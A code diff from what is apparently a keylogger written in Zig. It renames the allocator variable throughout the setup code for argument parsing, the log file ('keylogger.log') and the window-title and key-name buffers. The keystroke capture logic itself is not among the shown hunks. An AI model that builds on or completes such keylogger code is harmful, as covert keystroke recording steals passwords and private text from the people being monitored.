@@ -18,20 +18,20 @@ const PrevType = enum {
 
 pub fn main(init: std.process.Init) !void {
     const minimal = init.minimal;
-    const allocator = init.arena.allocator();
+    const gpa = init.arena.allocator();
     const io = init.io;
 
-    const stdout_buffer = try allocator.alloc(u8, 1024);
-    defer allocator.free(stdout_buffer);
+    const stdout_buffer = try gpa.alloc(u8, 1024);
+    defer gpa.free(stdout_buffer);
     var stdout_writer = std.Io.File.stdout().writer(io, stdout_buffer);
     const stdout = &stdout_writer.interface;
 
-    var args_iter = try minimal.args.iterateAllocator(allocator);
+    var args_iter = try minimal.args.iterateAllocator(gpa);
     defer args_iter.deinit();
     _ = args_iter.next();
 
-    var arg_output_format1 = try std.ArrayList(u8).initCapacity(allocator, 1024);
-    defer arg_output_format1.deinit(allocator);
+    var arg_output_format1 = try std.ArrayList(u8).initCapacity(gpa, 1024);
+    defer arg_output_format1.deinit(gpa);
 
     var arg_verbose: u8 = 0;
     var arg_use_date = false;
@@ -48,7 +48,7 @@ pub fn main(init: std.process.Init) !void {
         } else if (eql(u8, arg, "-o") or eql(u8, arg, "--output")) {
             if (args_iter.next()) |next_arg| {
                 arg_output_format1.clearRetainingCapacity();
-                try arg_output_format1.appendSlice(allocator, next_arg);
+                try arg_output_format1.appendSlice(gpa, next_arg);
             }
         } else if (eql(u8, arg, "-d") or eql(u8, arg, "--date")) {
             arg_use_date = true;
@@ -64,17 +64,17 @@ pub fn main(init: std.process.Init) !void {
 
     if (arg_output_format1.items.len == 0) {
         if (arg_use_date) {
-            try arg_output_format1.appendSlice(allocator, "keylogger_%Y%m%d_%H%M%S.log");
+            try arg_output_format1.appendSlice(gpa, "keylogger_%Y%m%d_%H%M%S.log");
         } else {
-            try arg_output_format1.appendSlice(allocator, "keylogger.log");
+            try arg_output_format1.appendSlice(gpa, "keylogger.log");
         }
     }
 
-    var arg_output_path_b = try allocator.alloc(u8, 1024);
-    defer allocator.free(arg_output_path_b);
+    var arg_output_path_b = try gpa.alloc(u8, 1024);
+    defer gpa.free(arg_output_path_b);
 
-    var arg_output_format2 = try allocator.allocSentinel(u8, 1024, 0);
-    defer allocator.free(arg_output_format2);
+    var arg_output_format2 = try gpa.allocSentinel(u8, 1024, 0);
+    defer gpa.free(arg_output_format2);
     const len = @min(arg_output_format1.items.len, arg_output_path_b.len - 1);
     @memcpy(arg_output_format2[0..len], arg_output_format1.items[0..len]);
     arg_output_format2[len] = 0;
@@ -98,8 +98,8 @@ pub fn main(init: std.process.Init) !void {
     });
     defer file.close(io); // Actually never reached because of while(true) later below.
 
-    const writer_buf = try allocator.alloc(u8, 1024);
-    defer allocator.free(writer_buf);
+    const writer_buf = try gpa.alloc(u8, 1024);
+    defer gpa.free(writer_buf);
     var file_writer = file.writer(io, writer_buf);
     const io_writer = &file_writer.interface;
 
@@ -116,11 +116,11 @@ pub fn main(init: std.process.Init) !void {
 
     const title_len: usize = 1024;
     const title_len_i: c_uint = @intCast(title_len - 1);
-    const ctitle_b = try allocator.alloc(u8, title_len);
-    const ptitle_b = try allocator.alloc(u8, title_len);
+    const ctitle_b = try gpa.alloc(u8, title_len);
+    const ptitle_b = try gpa.alloc(u8, title_len);
 
     const key_len: usize = 255;
-    const key_name_b = try allocator.alloc(u8, key_len);
+    const key_name_b = try gpa.alloc(u8, key_len);
 
     for (0..title_len) |n| {
         ctitle_b[n] = 0;
